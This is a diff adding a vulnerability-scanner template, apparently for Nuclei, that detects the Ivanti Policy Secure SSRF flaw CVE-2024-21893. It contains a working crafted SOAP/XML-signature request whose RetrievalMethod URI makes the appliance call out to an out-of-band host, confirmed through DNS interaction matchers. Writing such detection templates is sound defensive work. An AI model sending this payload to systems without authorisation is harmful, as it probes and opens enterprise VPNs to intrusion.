@@ -1,0 +1,31 @@
+id: ivanti-policy-secure-vpn-ssrf
+info:
+  name: Ivanti Policy Secure VPN SSRF (CVE-2024-21893)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: ssrf,cve,cve2024,dnslog
+
+variables:
+  reverse: '{{interactsh-url}}'
+
+http:
+  - raw:
+      - |
+        POST /dana-ws/saml20.ws HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+
+        <?xml version="1.0" encoding="UTF-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">  <soap:Body>   <ds:Signature   xmlns:ds="http://www.w3.org/2000/09/xmldsig#">      <ds:SignedInfo>       <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>        <ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>      </ds:SignedInfo>      <ds:SignatureValue>qwerty</ds:SignatureValue>     <ds:KeyInfo xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.w3.org/2000/09/xmldsig" xmlns:ds="http://www.w3.org/2000/09/xmldsig#">       <ds:RetrievalMethod URI="http://{{reverse}}"/>       <ds:X509Data/>      </ds:KeyInfo>     <ds:Object></ds:Object>   </ds:Signature> </soap:Body></soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "Ivanti"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
